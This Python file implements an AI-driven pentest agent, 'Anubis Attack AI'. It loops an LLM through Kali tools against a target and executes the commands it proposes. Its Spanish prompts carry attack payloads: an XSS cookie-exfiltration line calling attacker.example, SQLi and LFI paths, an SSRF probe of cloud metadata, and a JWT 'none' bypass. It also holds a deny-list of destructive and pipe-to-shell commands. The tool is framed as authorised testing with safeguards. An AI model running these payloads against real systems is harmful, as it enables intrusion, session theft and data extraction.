"""
Vector Agent — Anubis Attack AI
Loop agente que ejecuta vectores de pentest usando herramientas de Kali Linux.
"""
import os
import json
import re
import shlex
import subprocess
from urllib.parse import urlparse

# ── Límites por modo ──────────────────────────────────────────────────────────

QUICK_MAX_ITER   = 3
FULL_MAX_ITER    = 8
QUICK_CMD_TIMEOUT = 60
FULL_CMD_TIMEOUT  = 180
MAX_OUTPUT_CHARS  = 6000

# ── Whitelist y patrones prohibidos ──────────────────────────────────────────

ALLOWED_TOOLS = {
    'curl', 'wget', 'sqlmap', 'wfuzz', 'ffuf',
    'nuclei', 'gobuster', 'commix', 'testssl.sh', 'sslyze',
    'dirb', 'hydra', 'openssl',
    'grep', 'cat', 'echo', 'head', 'wpscan',
}
# 'python'/'python3' deliberadamente excluidos: un intérprete de propósito general
# anula por completo el sentido de la allowlist (red, filesystem, subprocess sin
# restricción). El SYSTEM_PROMPT_BASE tampoco los lista como herramienta disponible.

# Operadores de control de shell — cualquier comando se parte en estos puntos y
# CADA sub-comando resultante debe empezar con una herramienta de ALLOWED_TOOLS.
# Esto cierra el bypass de "el primer token pasa, lo que vaya después de ; && || & no se valida".
CONTROL_OPERATORS = {';', '&&', '||', '|', '&'}

FORBIDDEN_PATTERNS = [
    r'\brm\s+-',
    r'\bdd\b',
    r'\bmkfs\b',
    r'>\s*/dev/',
    r'\bshutdown\b',
    r'\breboot\b',
    r'\bpoweroff\b',
    r'\bcrontab\b',
    r'--os-shell',
    r'--file-write',
    r'--file-upload',
    r'\|\s*bash',
    r'\|\s*sh\b',
    r'curl[^|]*\|\s*[bsp]',
    r'wget[^|]*\|\s*[bsp]',
    r';\s*rm\s',
]

# ── Prompts ───────────────────────────────────────────────────────────────────

SYSTEM_PROMPT_BASE = """Eres un experto en ciberseguridad ofensiva realizando un engagement de pentesting AUTORIZADO y DOCUMENTADO. Tienes acceso a una máquina Kali Linux con las herramientas de pentesting estándar instaladas.

════════════════════════════════════════════════════════════════
ROL — FASE DE EXPLOTACIÓN (NO reconocimiento)
════════════════════════════════════════════════════════════════

El reconocimiento YA fue completado por módulos dedicados (WhatWeb, ZAP, Nikto, análisis de cabeceras, SSL).
Recibirás esos resultados en el contexto inicial.

PROHIBIDO en este agente:
• Correr whatweb, nmap, nikto, wafw00f u otras herramientas de fingerprinting/escaneo
• Repetir cualquier paso de reconocimiento que ya figure en los resultados previos
• Usar las iteraciones disponibles para confirmar tecnologías que ya están confirmadas

TU ÚNICO OBJETIVO: tomar los hallazgos ya disponibles y ATACAR / EXPLOTAR el vector asignado.
Arranca directamente en la fase de explotación desde la iteración 1.

════════════════════════════════════════════════════════════════
CONTRATO ÉTICO — REGLAS ABSOLUTAS SIN EXCEPCIÓN
════════════════════════════════════════════════════════════════

1. NUNCA causes denegación de servicio (DoS/DDoS):
   • Sin flood de peticiones (máx 10 req/seg)
   • --threads ≤ 5 en sqlmap, --rate ≤ 10 en nuclei/nmap
   • Sin stress testing, benchmarks ni fuzzing de alta concurrencia
   • Sin --level > 3 en sqlmap

2. PERMANECE en el scope autorizado:
   • Solo ataca la URL/dominio del target especificado
   • No pivotes hacia otros sistemas de la red interna
   • No uses datos encontrados para atacar sistemas de terceros

3. NO destruyas ni corrompas datos:
   • Solo SELECT en inyecciones SQL — jamás DROP, DELETE, TRUNCATE, UPDATE
   • Sin --os-shell, --file-write, --file-upload en sqlmap
   • Sin exploits que modifiquen, cifren o eliminen archivos del sistema objetivo
   • Solo lectura en el sistema objetivo (cat, whoami, id, hostname — nunca chmod, crontab, wget|sh)

4. REDACTA información sensible en evidencias:
   • Contraseñas: primeros 3 caracteres + "***"  (ej: "pas***")
   • API keys / tokens: últimos 4 caracteres precedidos de "****"  (ej: "****a3f9")
   • Datos PII: generaliza  (ej: "se encontraron 47 registros con emails de usuarios")
   • Hashes: primeros 8 caracteres + "..."  (ej: "5f4dcc3b...")

5. DOCUMENTA con precisión forense:
   • Registra el comando exacto que produjo evidencia
   • Captura el fragmento de respuesta relevante, no el output completo
   • Explica el impacto real que tendría un atacante con este hallazgo
   • Cuantifica el riesgo: cuántos registros, qué nivel de acceso, qué datos expuestos

════════════════════════════════════════════════════════════════
HERRAMIENTAS DE EXPLOTACIÓN DISPONIBLES
════════════════════════════════════════════════════════════════

• curl           → payloads HTTP: XSS, SQLi, LFI, SSRF, auth bypass, headers maliciosos
                   Ej: curl -s -d "user=admin'--" https://target.com/login
• wget           → descarga de recursos sin ejecutar
• wpscan         → enumeración y explotación de WordPress: plugins, temas, usuarios, CVEs
                   Ej: wpscan --url https://target.com --enumerate vp,u --api-token <TOKEN>
• sqlmap         → explotación SQL (SOLO --dbs, --tables, --dump --start=1 --stop=2, --threads 3)
• wfuzz / ffuf   → fuzzing de parámetros y rutas para encontrar superficie de ataque  (-t 5)
• nuclei -u      → plantillas de CVEs y exploits conocidos  (-t ~/nuclei-templates/)
• gobuster dir   → fuerza bruta de rutas y archivos sensibles  (-t 5 -q)
• commix         → explotación de inyección OS (SOLO: whoami, id, hostname, uname, cat)
• hydra          → ataques de autenticación (MÁXIMO 20 intentos, sin lockout agresivo)
• testssl.sh     → explotación de configuraciones TLS débiles
• sslyze         → verificación de vulnerabilidades TLS/SSL
• openssl s_client → handshakes manuales y verificación de cifrados
• dirb           → fuerza bruta de directorios con diccionario
• grep / cat / head → procesamiento local de outputs

════════════════════════════════════════════════════════════════
FORMATO DE RESPUESTA — JSON ESTRICTO
════════════════════════════════════════════════════════════════

Responde ÚNICAMENTE con JSON válido. Sin texto antes ni después. Sin bloques ```json```.

{
  "iteracion": <número entero>,
  "razonamiento": "<análisis detallado: qué sabes hasta ahora, qué hipótesis tienes y por qué el siguiente paso tiene sentido lógico>",
  "accion": "ejecutar_comando" | "finalizar",
  "herramienta": "<nombre de la herramienta principal>",
  "comando": "<comando completo listo para ejecutar en bash — SOLO si accion=ejecutar_comando>",
  "riesgo_comando": "bajo" | "medio" | "alto",
  "justificacion_riesgo": "<por qué ese nivel de riesgo para el sistema objetivo>",
  "resultado_final": {
    "estado": "explotable" | "no_explotable" | "inconcluso",
    "resumen": "<1-2 oraciones concisas para el reporte ejecutivo>",
    "evidencia_tecnica": "<output exacto o fragmento que prueba el hallazgo — con datos redactados si aplica>",
    "impacto_negocio": "<qué podría hacer un atacante real y cómo afecta a la organización>",
    "comando_clave": "<el comando exacto que confirmó la vulnerabilidad>",
    "recomendacion_mitigacion": "<pasos técnicos concretos y priorizados para mitigar>"
  }
}

IMPORTANTE: "resultado_final" solo se incluye cuando "accion" = "finalizar".
"""

QUICK_MODE_PROMPT = """
════════════════════════════════════════════════════════════════
MODO ACTIVO: PRUEBA RÁPIDA — Proof of Concept (PoC)
════════════════════════════════════════════════════════════════

OBJETIVO: Confirmar que el vector EXISTE y puede activarse. Nada más.
Tu trabajo es evidenciar el riesgo de forma mínima y controlada, sin causar daño alguno.

RESTRICCIONES DE ESTE MODO:
• Máximo {max_iter} iteraciones de herramientas en total
• No más de 15 peticiones HTTP al servidor
• Prefiere GET y HEAD sobre POST con payloads pesados
• Un solo payload de confirmación es suficiente — no iteres variantes
• DETENTE al primer síntoma claro de vulnerabilidad

SEÑALES QUE BASTAN PARA CONFIRMAR (una sola es suficiente):
• XSS reflected/stored:   el payload aparece sin sanitizar en la respuesta HTML/JS
• SQLi:                   error SQL en respuesta  O  comportamiento diferente con ' vs '' vs 1=1
• LFI:                    respuesta contiene root:x:0:0 u otro contenido de /etc/passwd
• SSRF:                   el servidor generó una petición HTTP a una URL externa controlada
• Auth bypass:            acceso a recurso protegido sin credenciales válidas
• Header injection:       header malicioso reflejado en la respuesta
• RCE:                    output de comando del sistema (uid=, hostname, Linux x.x)
• Open redirect:          la respuesta 302 apunta a un dominio externo
• Info disclosure:        stack trace, ruta absoluta, credencial, clave API visible

NO DEBES EN ESTE MODO:
• Extraer tablas ni volcar datos de bases de datos
• Usar --dump, --os-shell, --file-write en sqlmap
• Intentar escalar privilegios ni moverse lateralmente
• Enviar más de 1-2 payloads de prueba por vector

Al tener UNA señal de confirmación, finaliza inmediatamente con "accion": "finalizar".
"""

FULL_MODE_PROMPT = """
════════════════════════════════════════════════════════════════
MODO ACTIVO: EJECUCIÓN COMPLETA — Ethical Pentesting
════════════════════════════════════════════════════════════════

OBJETIVO: Explotar el vector para documentar el impacto real del negocio de forma controlada.

RESTRICCIONES DE ESTE MODO:
• Máximo {max_iter} iteraciones de herramientas
• Escala gradualmente: confirma → explota → documenta impacto
• Extrae evidencia real pero no destructiva
• Si encuentras un vector más crítico durante la ejecución, anótalo y continúa con el objetivo

GUÍA TÉCNICA POR TIPO DE VULNERABILIDAD:

SQLi (Inyección SQL):
  Iter 1: confirma  →  curl con payload ' o 1=1--
  Iter 2: sqlmap -u <url> --dbs --threads=3 --timeout=15
  Iter 3: sqlmap -u <url> -D <db> --tables --threads=3
  Iter 4: sqlmap -u <url> -D <db> -T <tabla> --dump --start=1 --stop=2 --threads=3
  NUNCA: --os-shell | --file-write | --all | --passwords (sin redactar)

XSS Reflected/Stored:
  Confirma con: <script>document.title='XSS_PoC'</script>
  Demuestra impacto con: <img src=x onerror="fetch('https://attacker.example?c='+document.cookie)">
  Para stored: verifica que persiste tras recargar la página
  Documenta: qué cookies, tokens de sesión o datos podría robar un atacante

LFI / Path Traversal:
  Prueba rutas: /etc/passwd, ../../../etc/passwd, ..%2F..%2F..%2Fetc%2Fpasswd
  Escalada: /etc/hosts, /proc/self/environ, /var/www/html/.env, config.php, wp-config.php
  Redacta CUALQUIER credencial encontrada

RCE / Commix:
  Comandos permitidos ÚNICAMENTE: whoami, id, hostname, uname -a, cat /etc/passwd (head -5)
  NUNCA: wget/curl de scripts, rm, chmod, crontab, useradd, nc -e
  Documenta: usuario obtenido, privilegios, sistema operativo

SSRF (Server-Side Request Forgery):
  Prueba internas: http://127.0.0.1/, http://localhost/, http://10.0.0.1/
  AWS metadata: http://169.254.169.254/latest/meta-data/
  Documenta: a qué servicios internos tiene acceso el servidor

Auth Bypass:
  Prueba: token vacío, token null, JWT con algoritmo 'none', cookies manipuladas
  Documenta: qué recursos protegidos quedan expuestos y el nivel de acceso obtenido

IDOR (Referencia Directa a Objetos):
  Prueba: incrementar/decrementar IDs, UUID predecibles o secuenciales
  Documenta: qué datos de otros usuarios son accesibles sin autorización

ESCALADA DE EVIDENCIA EN ESTE MODO:
  1. Confirmar (payload mínimo funciona)
  2. Explotar (extrae evidencia real del impacto)
  3. Documentar (comando exacto + output relevante + impacto de negocio)
  4. Recomendar (mitigación técnica específica y priorizada)
"""


# ── Validación de seguridad ───────────────────────────────────────────────────

def _split_command_segments(cmd: str) -> tuple:
    """Tokeniza respetando comillas (shlex) y separa en sub-comandos por operadores
    de control de shell (; && || |). Retorna (segments, has_background) — has_background
    indica si apareció un '&' suelto (no '&&'), que envía el proceso a segundo plano y
    así evade por completo el timeout de subprocess.run()."""
    lexer = shlex.shlex(cmd, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    tokens = list(lexer)

    has_background = '&' in tokens  # shlex ya distingue '&' de '&&' como tokens separados
    segments = [[]]
    for tok in tokens:
        if tok in CONTROL_OPERATORS:
            segments.append([])
        else:
            segments[-1].append(tok)
    return [seg for seg in segments if seg], has_background


# Herramientas que leen archivos por ruta — deben restringirse a /tmp (cwd de
# ejecución) para no poder asomarse al filesystem del propio host del agente.
FILE_READING_TOOLS = {'cat', 'head', 'grep'}


def validate_command(cmd: str, target_url: str) -> tuple:
    """Retorna (es_seguro: bool, razon: str)"""
    cmd = cmd.strip()
    if not cmd:
        return False, "Comando vacío"

    if '\n' in cmd or '\r' in cmd:
        return False, "Comandos multilínea no permitidos"

    # $(), ``, <(), >() permiten ejecutar comandos arbitrarios embebidos en un
    # argumento — ningún validador basado en "primer token" los detecta.
    if '$(' in cmd or '`' in cmd or '<(' in cmd or '>(' in cmd:
        return False, "Sustitución/composición de comandos no permitida ($(), ``, <(), >())"

    for pattern in FORBIDDEN_PATTERNS:
        if re.search(pattern, cmd, re.IGNORECASE):
            return False, f"Patrón prohibido detectado: {pattern}"

    try:
        segments, has_background = _split_command_segments(cmd)
    except ValueError as e:
        return False, f"Comando malformado (comillas sin cerrar): {e}"

    if has_background:
        return False, "Ejecución en segundo plano ('&') no permitida — evade el timeout del comando"

    if not segments:
        return False, "Comando vacío"

    # Cada sub-comando separado por ; && || | debe empezar con una herramienta
    # permitida — antes solo se validaba el primer token de TODO el comando, así
    # que "curl url; cat /etc/shadow" o "curl url && python3 -c ..." pasaban.
    for seg in segments:
        first_word = seg[0].split('/')[-1]
        if first_word not in ALLOWED_TOOLS:
            return False, f"Herramienta '{first_word}' no está en la lista permitida"

        # cat/head/grep solo pueden leer dentro de /tmp — si no, son una puerta
        # abierta a leer cualquier archivo del filesystem del host del agente.
        if first_word in FILE_READING_TOOLS:
            for arg in seg[1:]:
                if arg.startswith('/') and not arg.startswith('/tmp'):
                    return False, f"'{first_word}' no puede leer rutas fuera de /tmp: {arg}"

    # Redirecciones (> / >>) a rutas absolutas fuera de /tmp (cwd de ejecución).
    for m in re.finditer(r'>{1,2}\s*(\S+)', cmd):
        dest = m.group(1)
        if dest.startswith('/') and not dest.startswith('/tmp'):
            return False, f"Redirección a ruta fuera de /tmp no permitida: {dest}"

    # Límites duros de sqlmap — el system prompt los pide pero antes nada los hacía cumplir.
    if re.search(r'\bsqlmap\b', cmd, re.IGNORECASE):
        for flag, limit in (('threads', 5), ('level', 3), ('risk', 2)):
            m = re.search(rf'--{flag}[= ](\d+)', cmd, re.IGNORECASE)
            if m and int(m.group(1)) > limit:
                return False, f"sqlmap --{flag} supera el límite permitido ({limit})"

    return True, ""


def execute_shell_command(cmd: str, timeout: int = 60) -> str:
    """Ejecuta un comando en bash y retorna stdout+stderr, truncado."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, cwd='/tmp',
        )
        output = result.stdout or ''
        if result.stderr:
            output += '\n[STDERR]\n' + result.stderr
        if len(output) > MAX_OUTPUT_CHARS:
            output = output[:MAX_OUTPUT_CHARS] + f'\n[...truncado — {len(output)} chars totales]'
        return output or '(sin output)'
    except subprocess.TimeoutExpired:
        return f'[TIMEOUT] El comando excedió {timeout}s de límite'
    except Exception as e:
        return f'[ERROR] {e}'


def _clean_json(raw: str) -> dict:
    raw = raw.strip()
    raw = re.sub(r'^```(?:json)?\s*', '', raw, flags=re.IGNORECASE)
    raw = re.sub(r'\s*```\s*$', '', raw)
    start = raw.find('{')
    end = raw.rfind('}')
    if start != -1 and end != -1:
        raw = raw[start:end + 1]
    return json.loads(raw)


# ── Loop principal ────────────────────────────────────────────────────────────

def run_vector_agent(run_id: int, target_url: str, target_name: str,
                     waf: str, vector: dict, mode: str,
                     user_instructions: str, publish_fn, scan_context: str = ''):
    """
    Loop agente principal.
    publish_fn(msg: str) se llama por cada línea de log.
    Retorna dict con el resultado final.
    """
    from ai_agent import _call_ai

    is_quick = (mode == 'quick')
    max_iter = QUICK_MAX_ITER if is_quick else FULL_MAX_ITER
    cmd_timeout = QUICK_CMD_TIMEOUT if is_quick else FULL_CMD_TIMEOUT
    mode_prompt = (QUICK_MODE_PROMPT if is_quick else FULL_MODE_PROMPT).format(max_iter=max_iter)
    full_system = SYSTEM_PROMPT_BASE + mode_prompt

    scan_context_block = (
        f"\nRESULTADOS DE ESCANEOS PREVIOS (usa esta información directamente — no repitas fingerprinting):\n{scan_context}\n"
        if scan_context else ""
    )

    initial_ctx = f"""TARGET DE PENTEST:
- Nombre: {target_name}
- URL: {target_url}
- WAF detectado: {waf or 'No verificado'}
{scan_context_block}
VECTOR A EJECUTAR:
- Nombre técnico: {vector.get('nombre', 'N/A')}
- Título: {vector.get('titulo', 'N/A')}
- Prioridad: {vector.get('prioridad', 'N/A')}
- Intrusividad: {vector.get('intrusividad', 'N/A')}
- Justificación de la IA: {vector.get('justificacion', 'N/A')}
- Finding relacionado: {vector.get('finding_relacionado', 'No especificado')}

INSTRUCCIONES ADICIONALES DEL OPERADOR:
{user_instructions.strip() if user_instructions and user_instructions.strip() else 'Sin instrucciones adicionales — procede según el protocolo estándar.'}

Inicia el análisis. Responde en JSON estricto."""

    history = []
    iterations = 0
    final_result = None

    mode_label = 'PRUEBA RÁPIDA' if is_quick else 'EJECUCIÓN COMPLETA'
    publish_fn(f"[INICIO] Agente vector iniciado — modo: {mode_label}")
    publish_fn(f"[TARGET] {target_name} ({target_url})")
    publish_fn(f"[VECTOR] {vector.get('titulo', vector.get('nombre', '?'))}")
    publish_fn(f"[LÍMITE] {max_iter} iteraciones | {cmd_timeout}s por comando")

    while iterations < max_iter:
        iterations += 1
        publish_fn(f"\n[ITER {iterations}/{max_iter}] Consultando IA...")

        history_block = ""
        if history:
            history_block = "\n\n=== HISTORIAL DE EJECUCIÓN ===\n"
            for h in history:
                history_block += f"\n[Iteración {h['iter']}]\n"
                history_block += f"Razonamiento: {h['reasoning']}\n"
                history_block += f"Herramienta: {h['tool']}\n"
                history_block += f"Comando: {h['cmd']}\n"
                history_block += f"Output:\n{h['output']}\n---\n"
            history_block += "\nContinúa basándote en los resultados anteriores."

        prompt = f"{full_system}\n\n{initial_ctx}{history_block}"

        try:
            raw = _call_ai(prompt)
            step = _clean_json(raw)
        except Exception as e:
            publish_fn(f"[ERROR] IA falló en iteración {iterations}: {e}")
            break

        action = step.get('accion', 'finalizar')
        reasoning = step.get('razonamiento', '')
        publish_fn(f"[IA] {reasoning[:400]}{'...' if len(reasoning) > 400 else ''}")

        # Gemini incluye "resultado_final": null como placeholder incluso cuando
        # accion="ejecutar_comando" (contra lo que pide el prompt). Comprobar solo
        # "la clave existe" (`'resultado_final' in step`) hacía que CUALQUIER
        # respuesta cayera en la rama de finalizar y descartaba el comando real
        # que la IA sí proponía — por eso el agente nunca llegaba a ejecutar nada.
        # Hay que exigir contenido (truthy), no solo presencia de la clave.
        if action == 'finalizar' or step.get('resultado_final'):
            candidate = step.get('resultado_final') or {}
            if not candidate.get('estado') or not candidate.get('resumen'):
                # La IA dijo "finalizar" pero no entregó un resultado_final usable
                # (típicamente un corte de tokens a mitad de generación). Si lo
                # aceptamos tal cual, el run muere en la 1ª iteración con un
                # "inconcluso" vacío y un log engañoso de "límite de iteraciones
                # alcanzado". En vez de eso, se lo devolvemos como feedback y
                # dejamos que reintente dentro del presupuesto de iteraciones.
                publish_fn("[WARN] La IA indicó 'finalizar' sin un resultado_final completo (falta 'estado' o 'resumen') — se le pide reintentar")
                history.append({
                    'iter': iterations,
                    'reasoning': reasoning,
                    'tool': step.get('herramienta', '?'),
                    'cmd': '(sin comando — intento de finalizar incompleto)',
                    'output': '[SISTEMA] Tu respuesta anterior tenía accion="finalizar" pero "resultado_final" estaba vacío o incompleto. '
                              'Si ya puedes concluir, responde de nuevo con "resultado_final" completo (estado + resumen como mínimo). '
                              'Si aún necesitas ejecutar algo, usa accion="ejecutar_comando".',
                })
                continue

            final_result = candidate
            estado = final_result.get('estado', 'inconcluso')
            icons = {'explotable': '⚠ EXPLOTABLE', 'no_explotable': '✓ NO EXPLOTABLE', 'inconcluso': '? INCONCLUSO'}
            publish_fn(f"\n[RESULTADO] {icons.get(estado, estado.upper())}")
            publish_fn(f"[RESUMEN] {final_result.get('resumen', '')}")
            break

        cmd = step.get('comando', '').strip()
        if not cmd:
            # Igual que arriba: no tirar la toalla en la 1ª iteración — devolver
            # el problema a la IA y dejarla reintentar con el presupuesto restante.
            publish_fn("[WARN] IA no proporcionó comando — se le pide reintentar")
            history.append({
                'iter': iterations,
                'reasoning': reasoning,
                'tool': step.get('herramienta', '?'),
                'cmd': '(vacío)',
                'output': '[SISTEMA] No incluiste "comando" en tu respuesta. Si quieres ejecutar algo usa accion="ejecutar_comando" '
                          'con un "comando" no vacío; si ya tienes conclusión, usa accion="finalizar" con "resultado_final" completo.',
            })
            continue

        safe, reason = validate_command(cmd, target_url)
        if not safe:
            publish_fn(f"[BLOCKED] Comando rechazado: {reason}")
            history.append({
                'iter': iterations,
                'reasoning': reasoning,
                'tool': step.get('herramienta', '?'),
                'cmd': cmd,
                'output': f'[SEGURIDAD] Rechazado: {reason}. Propón un comando alternativo dentro de las reglas.',
            })
            continue

        risk = step.get('riesgo_comando', 'medio').upper()
        publish_fn(f"[CMD:{risk}] $ {cmd}")

        output = execute_shell_command(cmd, timeout=cmd_timeout)

        for line in output.split('\n')[:25]:
            if line.strip():
                publish_fn(f"  {line}")

        history.append({
            'iter': iterations,
            'reasoning': reasoning,
            'tool': step.get('herramienta', '?'),
            'cmd': cmd,
            'output': output,
        })

    if not final_result:
        publish_fn(f"[WARN] Límite de {max_iter} iteraciones alcanzado sin conclusión")
        last_cmd = history[-1]['cmd'] if history else ''
        final_result = {
            'estado': 'inconcluso',
            'resumen': f'Se ejecutaron {iterations} iteraciones sin conclusión definitiva. Requiere análisis manual.',
            'evidencia_tecnica': 'Ver logs de ejecución para los outputs detallados.',
            'impacto_negocio': 'No determinado en este run — se recomienda revisión manual.',
            'comando_clave': last_cmd,
            'recomendacion_mitigacion': 'Revisión manual por experto con los logs como base.',
        }

    final_result['iterations'] = iterations
    publish_fn(f"[DONE] Agente finalizado en {iterations} iteración(es)")
    return final_result
